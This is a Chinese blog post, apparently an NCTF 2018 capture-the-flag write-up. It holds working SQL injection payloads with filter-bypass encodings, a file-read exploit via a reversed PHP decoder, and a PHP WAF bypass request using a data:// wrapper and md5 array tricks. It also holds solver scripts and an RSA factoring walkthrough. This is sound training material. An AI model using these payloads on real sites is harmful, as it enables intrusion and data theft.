@@ -1,0 +1,1422 @@
+<!DOCTYPE HTML>
+<html lang="zh">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="NCTF 2018 Writeup, 网络安全">
+    <meta name="description" content="这两天和其他大佬参加了NCTF，题目质量不错。我主要负责做web题，期间也去尝试了下pwn的签到，学习了如何使用zio、pwntools。。。最后团队取得了总榜第9的成绩。  
+
+WEB：
+签到题:
+点开题目地址会直接跳转到百度，bp抓包重">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>NCTF 2018 Writeup | Aspirepig</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Aspirepig</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Aspirepig</div>
+        <div class="logo-desc">
+            
+            网络安全小菜鸡
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">NCTF 2018 Writeup</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">No tag</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/ctf/" class="post-category">
+                                ctf
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2018-11-26
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
+                    1.8k
+                </div>
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>这两天和其他大佬参加了NCTF，题目质量不错。我主要负责做web题，期间也去尝试了下pwn的签到，学习了如何使用zio、pwntools。。。最后团队取得了总榜第9的成绩。 <img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/860d441b119f5067f5b0f6f64d663cee.png"> <img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/bbbbcaf4496afcbc9bf785cb24e55402.png"></p>
+<hr>
+<h1 id="WEB："><a href="#WEB：" class="headerlink" title="WEB："></a>WEB：</h1><hr>
+<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题:"></a>签到题:</h2><hr>
+<p>点开题目地址会直接跳转到百度，bp抓包重放下得到flag，不过响应头中的flag才是真正的flag(皮的一匹) <img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/8419ff353800dd9af78dd3d1aad614ad.png"> &nbsp;</p>
+<h2 id="滴！晨跑打卡"><a href="#滴！晨跑打卡" class="headerlink" title="滴！晨跑打卡:"></a>滴！晨跑打卡:</h2><hr>
+<p>访问后是一个可以输入数字查询对应打卡信息的页面，应该是sql注入：<img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/bc456e1ed0688062730d2bf0401de8c5.png"> 经过尝试，题目过滤了 “空格”,”*“,”-“，可以使用如下代替：</p>
+<pre class="language-none"><code class="language-none">%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/   两个空格代替一个空格，用Tab代替空格，%a0=空格：</code></pre>
+
+<p>如下payload都可以取出flag：</p>
+<pre class="language-none"><code class="language-none">http://ctfgame.acdxvfsvd.net:20001/?id=99999'%a0union%a0select%a0user(),(SELECT%a0GROUP_CONCAT(th1s_1s_flag%a0SEPARATOR%a00x3c62723e)%a0FROM%a0flaaaaaaag.f144444444g),3'1
+
+http://ctfgame.acdxvfsvd.net:20001/index.php?id=999999'union(SELECT%0bGROUP_CONCAT(th1s_1s_flag),2,3%0bFROM%0bflaaaaaaag.f144444444g%0b);%00
+
+盲注payload：
+"http://ctfgame.acdxvfsvd.net:20001/index.php?id=2%27substr((select(th1s_1s_flag)from(flaaaaaaag.f144444444g)limit%0b0,1),"+str(i)+",1)='"+chr(j)</code></pre>
+
+<p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/0d09b48904574a4cc80be509b08a21cf.png"> 附上sql绕过方法:<a target="_blank" rel="noopener" href="http://www.cnblogs.com/Vinson404/p/7253255.html">http://www.cnblogs.com/Vinson404/p/7253255.html</a></p>
+<h2 id="Go-Lakers"><a href="#Go-Lakers" class="headerlink" title="Go Lakers:"></a>Go Lakers:</h2><hr>
+<p>和签到题一样，打开会自动跳转到百度，bp抓包重放，返回包拉到最下面可以看见post me viewsource<img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/2093a0bb02703e0b877c1eeb591539a1.png"></p>
+<p>然后，修改包为POST数据包，添加上:</p>
+<pre class="language-none"><code class="language-none">Content-Type: application/x-www-form-urlencoded</code></pre>
+
+<p>即可看到返回的源码<img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/404977b1a19d3d6c99a00882d6cd07b2.png"> 由于编码问题，需要导出为html文件，用浏览器打开即可</p>
+<pre class="language-none"><code class="language-none">&lt;?php 
+error_reporting(0); 
+include 'getip.php'; 
+ini_set('open_basedir','.'); 
+if(isset($_POST['viewsource'])){ 
+    highlight_file(__FILE__); 
+    die(); 
+} 
+
+mt_srand(mktime()+$seed); 
+
+function de_code($value){ 
+    $value = base64_decode($value); 
+    $result = ''; 
+    for($i=0;$i&lt;strlen($value);$i++){ 
+        $result .= chr(ord($value[$i])-$i*2); 
+    } 
+    return $result; 
+} 
+
+if(!(getip() === '127.0.0.1' &amp;&amp; file_get_contents($_GET['9527']) === 'nctf_is_good' &amp;&amp; mt_rand(1,10000) === intval($_GET['go_Lakers']))){ 
+    header('location:http://www.baidu.com'); 
+}else{ 
+    echo 'great'; 
+} 
+
+echo file_get_contents(de_code($_GET['file_'])); 
+
+?&gt; </code></pre>
+
+<p>仔细阅读可以发现，除了<code>post viewsource</code>时，整个脚本只会结束到die那意外，其他情况都是会执行到最后的</p>
+<pre class="language-none"><code class="language-none">echo file_get_contents(de_code($_GET['file_'])); </code></pre>
+
+<p>所以，我们需要利用这个点进行文件读取，<code>$_GET['file_']</code>经过<code>de_code</code>函数加密，所以这里传入的值应该是加密后的字符串，写出加密函数:</p>
+<pre class="language-none"><code class="language-none">function en_code($value){
+    $result = ''; 
+    for($i=0;$i&lt;strlen($value);$i++){ 
+        $result .= chr(ord($value[$i])+$i*2); 
+    }
+    $result = base64_encode($result);
+    return $result;
+}</code></pre>
+
+<p>对<code>flag.php</code>加密：<code>Zm5lbTZ6dH4=</code>请求后得到flag <img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/5120453c797acafd6e24a91c26d3c75d.png"> 题外话：前面的IP、9527、随机数都是迷惑条件。。。 通过读取<code>getip.php</code>可以看到<code>getip.php</code>源码</p>
+<pre class="language-none"><code class="language-none">&lt;?php
+$seed = '2163713';
+function getip(){
+        if($_SERVER['HTTP_X_FORWARDED_FOR']){
+            die('X_FORWARDED_FOR is good,but can you find another one?');
+        } elseif($_SERVER['HTTP_CLIENT_IP']){
+            $ip = $_SERVER['HTTP_CLIENT_IP'];
+        } else{
+            $ip = $_SERVER['REMOTE_ADDR'];
+         }
+       $ip  = preg_match('/^([0-9]{1,3}\.){3}[0-9]{1,3}$/',$ip) ? $ip : 'Unknown';
+       // echo $ip;
+       return $ip;
+    }</code></pre>
+
+<p>由此，取出来的是<code>HTTP_CLIENT_IP</code>,$seed也知道，就可以预测某秒钟产生的随机值(<code>mktime()</code>函数秒为单位),通过预测，然后用bp一直提交该预测出的随机值，服务器果然返回了great!！！<img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/bd6af7a4dfbe161064b93a9cb8f51187.png"></p>
+<h2 id="全球最大交友网站"><a href="#全球最大交友网站" class="headerlink" title="全球最大交友网站"></a>全球最大交友网站</h2><hr>
+<p>看到题目想到了应该是<code>.git</code>源码泄露，在题目连接后加上<code>/.git/HEAD</code>,证明的确存在<img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/89ae2a0035f5aa42c0f28caa9b47cf26.png"> 于是使用<code>GitHack</code>恢复源码，恢复出来的readme文件显示在tag1.0，于是使用<code>Git_Extract</code>将所有版本拖下来，得到flag<img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/4161a0fea063946d1fda174a186a33f1.png"></p>
+<h2 id="小绿草之最强大脑"><a href="#小绿草之最强大脑" class="headerlink" title="小绿草之最强大脑"></a>小绿草之最强大脑</h2><hr>
+<p>这个题竟然拿到了一血，也是很意外。可能大家都绕在了32位和64位的这个点上。打开题目，让自己设一个21位以上的数和网页上已经给出的算式相加，将自己设的数和计算后的答案通过post提交。<img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/8c668f827e02cc795ac5d8c56fa4d1e0.png"> html注释里写着源码泄露了解下，于是访问<code>index.php.bak</code>下载了源码如下：</p>
+<pre class="language-none"><code class="language-none">&lt;?php
+if(isset($_SESSION['ans']) &amp;&amp; isset($_POST['ans'])){
+if(($_SESSION['ans'])+intval($_POST['input'])!=$_POST['ans']){
+session_destroy();
+echo '
+&lt;script language="javascript"&gt;  
+alert("怎么没算对呢？");  
+window.history.back(-1);  &lt;/script&gt;';
+}
+else{
+if(intval(time())-$_SESSION['time']&lt;1){
+session_destroy();
+echo '
+&lt;script language="javascript"&gt;  
+alert("你手速太快啦，服务器承受不住!!!");  
+window.history.back(-1); &lt;/script&gt; ';
+}
+if(intval(time())-$_SESSION['time']&gt;2){
+session_destroy();
+echo '
+&lt;script language="javascript"&gt;  
+alert("你算的太慢了少年！");  
+window.history.back(-1); &lt;/script&gt; ';
+}
+echo '
+&lt;script language="javascript"&gt;  
+alert("tql，算对了！！");  
+     &lt;/script&gt; ';
+$_SESSION['count']++;
+}
+}
+?&gt;</code></pre>
+
+<p>注意到input值是经过intval转换的，而且有严格校验只能是纯数字，官方文档里面对intval函数有如下描述:<img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/e0512df51e526a37b3a9ce0fe54ef8b8.png"> 所以实际是将网页上的算式和32位或64位所能表示的最大的数进行相加，而提交的时候只需要input值为一个21位以上的数字字符串，脚本如下(得好好学正则了，每次都string[1:3]太真实了)：</p>
+<pre class="language-none"><code class="language-none">#/usr/bin/python
+# -*- coding: utf-8 -*-
+
+import requests
+import time
+import re
+
+url = 'http://ctfgame.acdxvfsvd.net:20004/index.php'
+
+def get(calu):
+    obj = ''
+    tmp = re.findall(r'&lt;div style="display:inline;"&gt;(.*?)&lt;/div&gt;',calu)
+    obj = obj.join(tmp)
+    obj = "9223372036854775807+"+obj[:-1]
+    time.sleep(1)
+    post(eval(obj))
+
+
+def post(ans):
+    post_data = {'input':123456789012345678902376575475476547547,'ans':ans}
+    print post_data
+    r = ss.post(url=url,data=post_data)
+    if 'nctf' in r.text:
+        print r.text
+        exit(0)
+    else:
+        get(r.content)
+
+ss=requests.session()
+r = ss.get(url)
+get(r.text)</code></pre>
+
+<p>&nbsp; <img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/70d53c8bfed5a4dba14c02f47b3dbdde.png"></p>
+<h2 id="easy-audit"><a href="#easy-audit" class="headerlink" title="easy_audit"></a>easy_audit</h2><hr>
+<p>访问题目直接给出了源码。</p>
+<pre class="language-none"><code class="language-none">&lt;?php 
+highlight_file(__FILE__); 
+error_reporting(0); 
+if($_REQUEST){ 
+    foreach ($_REQUEST as $key =&gt; $value) { 
+        if(preg_match('/[a-zA-Z]/i', $value))   die('waf..'); 
+    } 
+} 
+
+if($_SERVER){ 
+    if(preg_match('/yuligeflagnctf/i', $_SERVER['QUERY_STRING']))  die('waf..'); 
+} 
+
+if(isset($_GET['yulige'])){ 
+    if(!(substr($_GET['yulige'], 32) === md5($_GET['yulige']))){         //日爆md5!!!!!! 
+        die('waf..'); 
+    }else{ 
+        if(preg_match('/nctfisfun$/', $_GET['nctf']) &amp;&amp; $_GET['nctf'] !== 'nctfisfun'){ 
+            $getflag = file_get_contents($_GET['flag']); 
+        } 
+        if(isset($getflag) &amp;&amp; $getflag === 'ccc_liubi'){ 
+            include 'flag.php'; 
+            echo $flag; 
+        }else die('waf..'); 
+    } 
+} 
+?&gt; </code></pre>
+
+<p>中途遇到了很多问题，本地尝试了很多次，随后查看各个函数的php官方文档才找出最终的绕过方法，主要有以下几个点： 1.<code>request_order='GPC'</code>时 <code>$_REQUEST</code>会按照<code>($_COOKIE)&gt;$_POST&gt;$_GET</code>变量覆盖 也就是get方式传<code>nctf=1</code>和post方式传<code>nctf=2</code>在同时传递的时候，<code>$_REQUES</code>里<code>nctf=2</code> 2. <code>$_SERVER['QUERY_STRING']</code>这个变量是取得原始url查询串，并没有url解码，所以如果传<code>?nct%66=1&nbsp;</code> &nbsp; <code>$_SERVER['QUERY_STRING']</code>的值仍然是<code>nct%66=1</code> <a target="_blank" rel="noopener" href="http://web.chacuo.net/charseturlencode">http://web.chacuo.net/charseturlencode</a>这个网站可以将普通字符url编码 3. Md5加密数组返回值为NULL，substr截取数组也会返回NULL 4. <code>preg_match('/nctfisfun$/)</code> 这个只需要是nctfisfun结尾就能满足 5. 最后的<code>file_get_contents($_GET['flag'])</code>，不能用原来的php://input，因为post有其他数据，所以用的<code>data://text/plain;base64,Y2NjX2xpdWJ</code> ，其中<code>Y2NjX2xpdWJ</code>即为ccc_liubi的base64编码(我在本地尝试过通过<code>http协议</code>获取远程内容为ccc_liubi的文件，可以getflag，然而题目地址不行)</p>
+<pre class="language-none"><code class="language-none">payload数据包：
+POST /?%79%75%6c%69%67%65[]=1&amp;nct%66=1n%63%74%66%69%73%66%75%6e&amp;%66lag=data://text/plain;base64,Y2NjX2xpdWJp HTTP/1.1
+Host: ctfgame.acdxvfsvd.net:20007
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 13
+
+nctf=1&amp;flag=1</code></pre>
+
+<p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/a6dd71fc0bf0ee02ead3530abc07cc7c.png"></p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><hr>
+<h2 id="CalcNow："><a href="#CalcNow：" class="headerlink" title="CalcNow："></a>CalcNow：</h2><hr>
+<p>连接上远程端口后，输入Team的token，会返回一个算式，需要在两秒内算好发送过去<img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/25299270bb4e12543cd81ab75ec9c838.png"> 使用zio模块，编写脚本 getflag</p>
+<pre class="language-none"><code class="language-none">from zio import *
+
+r = zio(('47.110.195.228',30003))
+r.writeline('JWGthxProBatsx9WcOSJXvyIlndG6qQe')
+r.read_until('...\n')
+tmp = r.readline()
+tmp = tmp.replace(' add ','+').replace(' mul ','*').replace(' xor ','^').replace(' sub ','-')
+r.writeline(str(eval(tmp)))
+r.read()</code></pre>
+
+<p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/0133d7cf007aba81fe6088b1a3f14fd6.png"> &nbsp;</p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><hr>
+<h2 id="Easy-RSA"><a href="#Easy-RSA" class="headerlink" title="Easy RSA:"></a>Easy RSA:</h2><p>题目：</p>
+<pre class="language-none"><code class="language-none">n = 24585768801100871989460458412563674690545986652089097718040761783186739174559136657307807040444318337561194142282186006216583089898423180103199568738639814413601595196467099996734334212909157604318709957690532885862891927163713619932622153281344607898846228206181834468325246573910857887714824338949742479585089251882243488454602710292507668577598274622372304293403731722318890268908300308478539449464617438721833942643889296634768118375076052778833640986893990732882252524850152650060780854621796349622086656401914022236044924841914313726991826438982902866584892213702893596657746111940812657202364588469026832387629
+p - q = 14048479366496281701869293063643750801596179514889914988732592464154208813942939793532694949932787548745769133200541469022315588864587160064703369956054828780928008235304461825448872454098086255531582368864754318040219023548966787642948010656526691472780392631956031751285174567712974691729142190835749586660
+e = 65537
+c = 13043206753625359891696429504613068427529111016070088678736297291041435652992434742862062899975037273524389833567258051170507686131853178642412748377655159798601888072877427570380109085131089494464136940524560062629558966202744902709909907514127527274581612606840291391818050072220256661680141666883565331886278443012064173917218991474525642412407692187407537171479651983318468186723172013439034765279464665108704671733067907815695414348312753594497823099115037082352616886076617491904991917443093071262488786475411319592529466108485884029307606114810451140886975584959872328937471166255190940884805476899976523580343</code></pre>
+
+<p>的却是根据公式<code>n=pq</code>&nbsp; <code>p-q=14048...</code>列出一元二次方程组，解出<code>pq&nbsp;</code> 算出私钥<code>d</code>&nbsp; &nbsp;再用<code>d</code>解出明文 具体使用工具及方法，参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/CosmopolitanMe/article/details/76321621">https://blog.csdn.net/CosmopolitanMe/article/details/76321621</a> 最后解出明文m:<code>m=45411192849370852342508097771685415309715836886014345394100707709</code> 再用BigIntergerCal转为十六进制转为字符得到flag:<code>nctf{my_M4th_1s_t00_b4d!!!}</code></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        Author:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Aspirepig</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        Link:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://aspirepig.cn/2018/11/26/nctf-writeup/">https://aspirepig.cn/2018/11/26/nctf-writeup/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        Reprint policy:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    All articles in this blog are used except for special statements
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    reprint policy. If reproduced, please indicate source
+                    <a href="/about" target="_blank">Aspirepig</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">No tag</span>
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
